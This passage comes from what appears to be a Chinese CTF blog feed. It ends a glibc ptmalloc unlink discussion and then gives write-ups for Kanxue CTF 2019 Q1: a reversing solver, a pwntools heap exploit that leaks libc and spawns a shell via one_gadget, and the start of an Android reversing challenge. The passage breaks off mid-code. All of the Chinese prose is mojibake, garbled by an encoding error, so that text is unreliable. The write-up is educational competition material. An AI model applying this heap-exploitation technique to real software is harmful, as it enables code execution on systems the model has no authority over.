class="keyword">else</span> &#123;							       \</span></span><br><span class="line"><span class="meta">	P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		       \</span></span><br><span class="line"><span class="meta">	P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		       \</span></span><br><span class="line"><span class="meta">      &#125;								       \</span></span><br><span class="line"><span class="meta">    &#125;								       \</span></span><br><span class="line"><span class="meta">  &#125;                                                                    \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­æœ€ä¸ºå…³é”®çš„ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk = BK;                                                       \</span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure></div>

<p>åˆ©ç”¨ unlink çš„æ”»å‡»å®é™…ä¸Šåˆ©ç”¨çš„å°±æ˜¯è¿™ä¸¤å¥ä»£ç ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶æŸä¸ª chunk çš„ bk å’Œ fdï¼Œå¹¶ä¸”èƒ½å¤Ÿç»•è¿‡ä¸€äº›éªŒè¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å®Œæˆä¸€æ¬¡ unlink æ”»å‡»ï¼Œä½†æ˜¯è¿™ä¸æ˜¯æœ¬æ–‡è®¨è®ºçš„é‡ç‚¹ï¼Œç½‘ç»œä¸Šæœ‰å¾ˆå¤šå¤§ç‰›è¯¦ç»†è§£æäº† unlink æ”»å‡»çš„åŸç†ï¼Œå¤§å®¶å¯ä»¥è‡ªè¡Œæœç´¢å­¦ä¹ ã€‚</p>
<h2 id="æ€»ç»“ä¸€ä¸‹"><a href="#æ€»ç»“ä¸€ä¸‹" class="headerlink" title="æ€»ç»“ä¸€ä¸‹"></a>æ€»ç»“ä¸€ä¸‹</h2><p>è‡³æ­¤æˆ‘ä»¬é€šè¿‡ glibc çš„æºä»£ç å¤§è‡´åˆ†æäº†ä¸€ä¸‹ ptmalloc ä¸­çš„ malloc å’Œ free ä¸¤ä¸ªå¸¸ç”¨å‡½æ•°ï¼Œç”±äºå †æº¢å‡ºç»å¸¸å‡ºç°åœ¨ä¸€äº› CTF æ¯”èµ›ä¸­ï¼Œæ‰€ä»¥ä»æ ¹æºä¸Šç†è§£è¿™äº›ä¸œè¥¿å¯¹äºæˆ‘ä»¬æ·±å…¥å­¦ä¹ å’ŒæŒæ¡å †æº¢å‡ºæ˜¯å¾ˆæœ‰å¸®åŠ©çš„ï¼Œptmalloc éå¸¸æ³¨é‡æ€§èƒ½ï¼Œä½†æ˜¯æ‰€è°“æœ‰å¾—å¿…æœ‰å¤±ï¼Œæ³¨é‡æ€§èƒ½çš„ä»£ä»·å°±æ˜¯å®‰å…¨æ€§ä¸é«˜ï¼Œå’Œ windows çš„å †ç®¡ç†ç­–ç•¥ç›¸æ¯”å¯è°“å°å·«è§å¤§å·«äº†ã€‚</p>
<p>ptmalloc ä¸­è¿˜æœ‰å‡ ä¸ªä¸å†…å­˜åˆ†é…ç›¸å…³çš„å‡½æ•°å¦‚ realloc ç­‰ï¼Œä½†æ˜¯å®ƒä»¬çš„æ ¸å¿ƒæ€æƒ³éƒ½æ˜¯ä¾æ‰˜ç°æœ‰çš„ç¼“å†²åŒºï¼Œå°½é‡å‡å°‘å‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜çš„æ¬¡æ•°ï¼Œä»¥è¾¾åˆ°æé«˜ç¨‹åºæ‰§è¡Œæ•ˆç‡çš„ç›®çš„ã€‚</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>ååº­ ã€ŠGlibc å†…å­˜ç®¡ç† Ptmalloc2 æºä»£ç åˆ†æã€‹</p>
<p>cloudburst ptmalloc flow chart</p>
<p><a class="link"   href="http://www.cnblogs.com/zhaoyl/p/3820852.html" >http://www.cnblogs.com/zhaoyl/p/3820852.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>çœ‹é›ª CTF 2019 Q1</title>
    <url>/2019/03/11/kanxue2019Q1/</url>
    <content><![CDATA[<p>çœ‹é›ª CTF 2019 Q1</p>
<span id="more"></span>

<h2 id="æµæµªè€…"><a href="#æµæµªè€…" class="headerlink" title="æµæµªè€…"></a>æµæµªè€…</h2><p>åé“é¢˜ä¸­æœ€ç®€å•çš„ä¸€é“é¢˜ç›®ï¼Œç¨‹åºè¦æ±‚è¾“å…¥ä¸€ä¸ªå¯†ç ï¼Œé¦–å…ˆåˆ¤æ–­äº†å¯†ç æ˜¯å¦ç”±å­—æ¯ + æ•°å­—ç»„æˆï¼Œç„¶åä¼šå°†å®ƒä»¬è¿›è¡Œä¸€æ­¥è½¬æ¢ï¼Œå…¶ç®—æ³•å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; flag[i]; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( flag[i] &gt; <span class="string">&#x27;9&#x27;</span> || flag[i] &lt; <span class="string">&#x27;0&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( flag[i] &gt; <span class="string">&#x27;z&#x27;</span> || flag[i] &lt; <span class="string">&#x27;a&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( flag[i] &gt; <span class="string">&#x27;Z&#x27;</span> || flag[i] &lt; <span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">        sub_4017B0();</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        int_flag[i] = flag[i] - <span class="number">29</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      int_flag[i] = flag[i] - <span class="number">87</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    int_flag[i] = flag[i] - <span class="number">48</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åä¼šå°†ç»è¿‡è½¬æ¢çš„å¯†ç ä¼ å…¥å¦ä¸€ä¸ªå‡½æ•°ï¼Œä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">BOOL __cdecl <span class="title function_">sub_4017F0</span><span class="params">(<span class="type">int</span> int_flag)</span></span><br><span class="line">&#123;</span><br><span class="line">  BOOL result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> Str1[<span class="number">28</span>]; <span class="comment">// [esp+D8h] [ebp-24h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+F4h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+F8h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *(int_flag + <span class="number">4</span> * v4) &lt; <span class="number">62</span> &amp;&amp; *(int_flag + <span class="number">4</span> * v4) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    Str1[v4] = aAbcdefghiabcde[*(int_flag + <span class="number">4</span> * v4)];</span><br><span class="line">    ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  Str1[v4] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(Str1, <span class="string">&quot;KanXueCTF2019JustForhappy&quot;</span>) )</span><br><span class="line">    result = sub_401770();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = sub_4017B0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æŠŠå¯†ç ä½œä¸ºä¸‹æ ‡ï¼Œä»ä¸€ä¸ªç¡¬ç¼–ç çš„å­—ç¬¦ä¸²ä¸­å–å‡ºå¯¹åº”çš„å­—ç¬¦ï¼Œè¦æ±‚æœ€ç»ˆæ‹¼æ¥çš„ç»“æœæ˜¯ â€œKanXueCTF2019JustForhappyâ€ï¼Œæ€è·¯å¾ˆç®€å•ï¼Œåªéœ€è¦é€†æ¨å›å»å°±å¥½äº†ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯é€†æ¨å›å»çš„å­—ç¬¦æœ‰å¤šé‡æ’åˆ—å¯èƒ½ï¼Œé€šè¿‡åŠ¨æ€è°ƒè¯•å°±å¯ä»¥æ‰¾å‡ºçœŸæ­£çš„ flagã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">table = &quot;abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ&quot;</span><br><span class="line">target = &quot;KanXueCTF2019JustForhappy&quot;</span><br><span class="line">for i in range(len(target)):</span><br><span class="line">    for k in range(len(table)):</span><br><span class="line">        if target[i] == table[k]:</span><br><span class="line">            print(k)</span><br><span class="line">            break</span><br><span class="line">rela = [19,0,27,59,44,4,11,55,14,30,28,29,37,18,44,42,43,14,38,41,7,0,39,39,48]</span><br><span class="line">for i in rela:</span><br><span class="line">    print(chr(i + 29) + &quot;\t&quot; + chr(i + 87) + &quot;\t&quot; + chr(i + 48) + &quot;\n&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># j0rXI4bTeustBiIGHeCF70DDM</span><br></pre></td></tr></table></figure></div>

<h2 id="C-ä¸-C"><a href="#C-ä¸-C" class="headerlink" title="C ä¸ C++"></a>C ä¸ C++</h2><p>ç¨‹åºçš„ä¸»è¦ç¼ºé™·åœ¨äºå°† C å’Œ C++ çš„å†…å­˜åˆ†é…ã€å›æ”¶å‡½æ•°è¿›è¡Œäº†æ··ç”¨ï¼ŒåŸåˆ™ä¸Šé€šè¿‡ malloc åˆ†é…çš„å†…å­˜å¿…é¡»ä½¿ç”¨ free å›æ”¶ï¼Œè€Œä¸èƒ½ç”¨ delete å›æ”¶ï¼ŒåŒæ ·çš„ï¼Œnew åˆ†é…çš„å†…å­˜åªèƒ½ä½¿ç”¨ delete è¿›è¡Œå›æ”¶ï¼Œè€Œä¸èƒ½ä½¿ç”¨ free å›æ”¶ã€‚  </p>
<p>ä½†æ˜¯é¢˜ç›®ä¸­åŒæ—¶ç»™å‡ºäº† mallocã€freeã€new å’Œ deleteï¼Œå¹¶ä¸”æ²¡æœ‰é™åˆ¶å‡½æ•°çš„è°ƒç”¨ï¼Œè¿™æ—¶å°±æœ‰å¯èƒ½é€ æˆä¸€äº›é—®é¢˜ã€‚  </p>
<p>ä¸»è¦æ¼æ´åœ¨ del å‡½æ•°ï¼Œä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">del</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> (***v1)(); <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">void</span> (***v2)(); <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> (*v3)(); <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v1 = chunk_list[a1];</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = &amp;v1[<span class="number">3</span> * *(v1 - <span class="number">1</span>)];</span><br><span class="line">    <span class="keyword">while</span> ( v2 != v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v2 -= <span class="number">3</span>;</span><br><span class="line">        v3 = **v2;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == nullsub_1 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        (v3)(v2);                               <span class="comment">// ä»»æ„å‡½æ•°è°ƒç”¨</span></span><br><span class="line">        v1 = chunk_list[a1];</span><br><span class="line">        <span class="keyword">if</span> ( v2 == v1 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_6:</span><br><span class="line">    operator delete[](v2 - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  chunk_list[a1] = <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>é€šè¿‡ new åˆ†é…çš„å†…å­˜ä¸­å­˜åœ¨ä¸€äº›ä»£ç æ®µæŒ‡é’ˆï¼Œå…¶å€¼ä¸º 0x401228ï¼Œåœ¨ del å‡½æ•°ä¸­å¯¹è¿™ä¸ªåœ°å€è¿›è¡Œäº†éªŒè¯ï¼Œå¦‚æœè¿™ä¸ªåœ°å€å·²ç»è¢«ä¿®æ”¹ï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨å®ƒæŒ‡å‘çš„ä»£ç ã€‚ç°åœ¨ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„æ€è·¯å°±æ˜¯æƒ³åŠæ³•ä¿®æ”¹è¿™ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘æˆ‘ä»¬æƒ³è¦çš„åœ°å€ã€‚</p>
<p>ç”±äºç¨‹åºä¸­ C å’Œ C++ ä»£ç æ··ç”¨çš„é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ delete æ¥å›æ”¶ malloc çš„å†…å­˜ï¼Œå¦‚æœæå‰åœ¨ malloc å‡ºæ¥çš„å†…å­˜ä¸­ä¼ªé€ å¥½æ•°æ®ï¼Œå°±æœ‰å¯èƒ½æ„é€ ä¸€æ¡å‡½æ•°â€œè°ƒç”¨é“¾â€ï¼Œè¿›è€Œæ‹¿åˆ° shellã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./candcpp&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">context(log_level=<span class="string">&quot;DEBUG&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input length of the string\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input the string\n&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input index of the string\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">length, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input length of the string\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input the string\n&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input index of the string\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your name: &quot;</span>)</span><br><span class="line">p.sendline(p64(<span class="number">0x400e10</span>) + p64(<span class="number">0x4009a0</span>))</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">&quot;bbbbbbbb&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;c&quot;</span> * <span class="number">548</span> + p64(<span class="number">0x602328</span> + <span class="number">8</span>) + <span class="string">&quot;aaaaaaa&quot;</span> + p64(<span class="number">0x602328</span>)</span><br><span class="line">new(<span class="number">0x300</span>, payload)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>) - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_addr: 0x%x&quot;</span> % libc_addr)</span><br><span class="line">one_gadget = libc_addr + <span class="number">0xf02a4</span></span><br><span class="line">log.info(<span class="string">&quot;one_gadget: 0x%x&quot;</span> % one_gadget)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your name: &quot;</span>)</span><br><span class="line">p.sendline(p64(one_gadget))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">&quot;bbbbbbbb&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;c&quot;</span> * <span class="number">556</span> + p64(<span class="number">0x602328</span> + <span class="number">8</span>) + <span class="string">&quot;aaaaaaa&quot;</span> + p64(<span class="number">0x602328</span>)</span><br><span class="line">new(<span class="number">0x300</span>, payload)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="å˜å½¢é‡‘åˆš"><a href="#å˜å½¢é‡‘åˆš" class="headerlink" title="å˜å½¢é‡‘åˆš"></a>å˜å½¢é‡‘åˆš</h2><p>å®‰å“é¢˜ç›®ï¼Œä¸€å¼€å§‹ç”¨ JEB çœ‹ï¼Œå‘ç°ä¸»è¦çš„ä»£ç ä¼¼ä¹æœ‰äº›é—®é¢˜ï¼Œå› ä¸ºè¡Œä¸ºå’ŒçœŸæœºä¸Šæ“ä½œçš„å¹¶ä¸ä¸€æ ·ï¼Œå½“å¯†ç è¾“å…¥é”™è¯¯æ—¶ä¼šè¾“å‡º errorï¼Œè¿™ä¸€ç‚¹åœ¨ä»£ç ä¸­ä¹Ÿæ²¡æœ‰æ‰¾åˆ°ã€‚åæ¥ç”¨ APKIDE æŸ¥çœ‹ç¨‹åºï¼Œæœç´¢â€œç”¨æˆ·åæˆ–å¯†ç ä¸ºç©ºâ€è¿™ä¸ªå­—ç¬¦ä¸²çš„æ—¶å€™å‘ç°åœ¨ android\support\v7\app ç›®å½•ä¸‹é¢å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ä¹ŸåŒ…å«è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå®é™…ä¸Šè¿™ä¸ªæ‰æ˜¯çœŸæ­£çš„ä»£ç ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> android.support.v7.app;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.text.TextUtils;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AppCompiatActivity$1</span></span><br><span class="line">  <span class="keyword">implements</span> <span class="title class_">View</span>.OnClickListener</span><br><span class="line">&#123;</span><br><span class="line">  AppCompiatActivity$<span class="number">1</span>(AppCompiatActivity paramAppCompiatActivity) &#123;&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View paramView)</span></span><br><span class="line">  &#123;</span><br><span class="line">    AppCompiatActivity.access$<span class="number">002</span>(<span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>, AppCompiatActivity.access$<span class="number">100</span>(<span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>).getText().toString());</span><br><span class="line">    AppCompiatActivity.access$<span class="number">202</span>(<span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>, AppCompiatActivity.access$<span class="number">300</span>(<span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>).getText().toString());</span><br><span class="line">    <span class="keyword">if</span> ((!TextUtils.isEmpty(AppCompiatActivity.access$<span class="number">000</span>(<span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>))) &amp;&amp; (!TextUtils.isEmpty(AppCompiatActivity.access$<span class="number">200</span>(<span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">      paramView = AppCompiatActivity.access$<span class="number">400</span>(<span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>);</span><br><span class="line">      <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">      paramView.setEnabled(<span class="literal">false</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0.</span>eq(AppCompiatActivity.access$<span class="number">200</span>(<span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>)))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="type">byte</span>[] arrayOfByte = AppCompiatActivity.access$<span class="number">200</span>(<span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>).getBytes();</span><br><span class="line">        paramView = arrayOfByte;</span><br><span class="line">        <span class="keyword">if</span> (arrayOfByte.length != <span class="number">24</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          paramView = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">24</span>];</span><br><span class="line">          <span class="keyword">while</span> (i &lt; paramView.length)</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="type">int</span> j;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; arrayOfByte.length) &#123;</span><br><span class="line">              j = arrayOfByte[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              j = (<span class="type">byte</span>)i;</span><br><span class="line">            &#125;</span><br><span class="line">            paramView[i] = ((<span class="type">byte</span>)j);</span><br><span class="line">            i++;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        arrayOfByte = AppCompiatActivity.access$<span class="number">500</span>(paramView, <span class="string">&quot;2ggdrsLgM7iPNYPQrD58Rg==&quot;</span>.getBytes());</span><br><span class="line">        <span class="type">AppCompiatActivity</span> <span class="variable">localAppCompiatActivity</span> <span class="operator">=</span> <span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>;</span><br><span class="line">        paramView = <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        paramView.append(<span class="string">&quot;flag&#123;&quot;</span>);</span><br><span class="line">        paramView.append(<span class="keyword">new</span> <span class="title class_">String</span>(arrayOfByte));</span><br><span class="line">        paramView.append(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        Toast.makeText(localAppCompiatActivity, paramView.toString(), <span class="number">1</span>).show();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>, <span class="string">&quot;error&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Toast.makeText(<span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>, <span class="string">&quot;ç”¨æˆ·åæˆ–å¯†ç ä¸ºç©º&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>è°ƒç”¨äº† liboo000oo.so è¿™ä¸ªåº“ï¼Œç”¨ IDA æ‰“å¼€å‘ç°é‡Œé¢çš„é€»è¾‘å¾ˆå¤æ‚ï¼ŒåŸºæœ¬ä¸Šæ²¡åŠæ³•é™æ€é€†å‘ï¼Œæ‰€ä»¥ä¸ŠçœŸæœºå¼€å§‹åŠ¨æ€è°ƒè¯•ã€‚  </p>
<p>è°ƒè¯•çš„æ—¶å€™ä¹Ÿè¸©äº†å¾ˆå¤šå‘ï¼Œå…³é”®å‡½æ•°ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_CDEAB784</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  s = (*(*a1 + <span class="number">0x2A4</span>))();</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(a650f909c721736);</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(v1);</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(v1);</span><br><span class="line">  v4 = <span class="built_in">malloc</span>(v1);</span><br><span class="line">  _aeabi_memclr(v2, v1);</span><br><span class="line">  _aeabi_memclr(v3, v1);</span><br><span class="line">  _aeabi_memclr(v4, v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    v6 = v1;</span><br><span class="line">    v7 = a650f909c721736;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = *v7++;</span><br><span class="line">      <span class="keyword">if</span> ( v8 != <span class="string">&#x27;-&#x27;</span> )</span><br><span class="line">        v3[v5++] = v8;                          <span class="comment">// æ¯ä¸ªå­—ç¬¦è‡ªå¢ 1</span></span><br><span class="line">      --v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v6 );</span><br><span class="line">    <span class="keyword">if</span> ( v5 &gt;= <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = v5 - <span class="number">1</span>;</span><br><span class="line">      v10 = <span class="number">-8</span>;</span><br><span class="line">      v11 = <span class="number">0</span>;</span><br><span class="line">      v12 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (v11 | (v10 &gt;&gt; <span class="number">2</span>)) &gt; <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v13 = v12;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v13 = v12 + <span class="number">1</span>;</span><br><span class="line">          v2[v12] = <span class="number">45</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v14 = v3[v9--];</span><br><span class="line">        v11 += <span class="number">0x40000000</span>;</span><br><span class="line">        v2[v13] = v14;</span><br><span class="line">        ++v10;</span><br><span class="line">        v12 = v13 + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v9 != <span class="number">-1</span> );</span><br><span class="line">      <span class="keyword">if</span> ( v13 &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v15 = v4;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v16 = *v2;</span><br><span class="line">          <span class="keyword">if</span> ( (v16 - <span class="string">&#x27;a&#x27;</span>) &lt;= <span class="number">5u</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( (v16 - <span class="string">&#x27;0&#x27;</span>) &lt;= <span class="number">9u</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v16 = &amp;aDbeafc24097158[v16 - <span class="number">42</span>];</span><br><span class="line">            <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">          &#125;</span><br><span class="line">LABEL_19:</span><br><span class="line">          *v15++ = v16;</span><br><span class="line">          --v12;</span><br><span 